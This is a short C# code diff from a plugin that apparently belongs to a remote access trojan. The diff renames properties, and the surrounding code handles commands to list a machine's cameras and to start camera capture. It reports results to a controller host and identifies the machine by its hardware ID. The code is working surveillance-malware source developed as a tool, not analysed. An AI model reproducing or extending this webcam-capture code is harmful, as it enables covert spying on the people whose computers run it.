@@ -19,12 +19,12 @@ namespace Plugin
         public static void Main(LoadingAPI loadingAPI)
         {
             cameraCapture = false;
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
                 case PacketType.RC_GET_CAM:
-                    ClientHandler clientHandlerGetCam = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID);
+                    ClientHandler clientHandlerGetCam = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                     clientHandlerGetCam.ConnectStart();
-                    RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket(GetCameras.GetListCameras(), loadingAPI.baseIp, loadingAPI.HWID);
+                    RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket(GetCameras.GetListCameras(), loadingAPI.BaseIp, loadingAPI.HWID);
                     while (!clientHandlerGetCam.Connected)
                         Thread.Sleep(125);
                     clientHandlerGetCam.SendPacket(remoteCameraPacket);
@@ -32,8 +32,8 @@ namespace Plugin
 
                case PacketType.RC_CAPTURE_ON:
                     cameraCapture = true;
-                    remoteCameraCapturePacket = (RemoteCameraCapturePacket)loadingAPI.currentPacket;
-                    clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID);
+                    remoteCameraCapturePacket = (RemoteCameraCapturePacket)loadingAPI.CurrentPacket;
+                    clientHandler = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                     clientHandler.ConnectStart();
                     break;
 
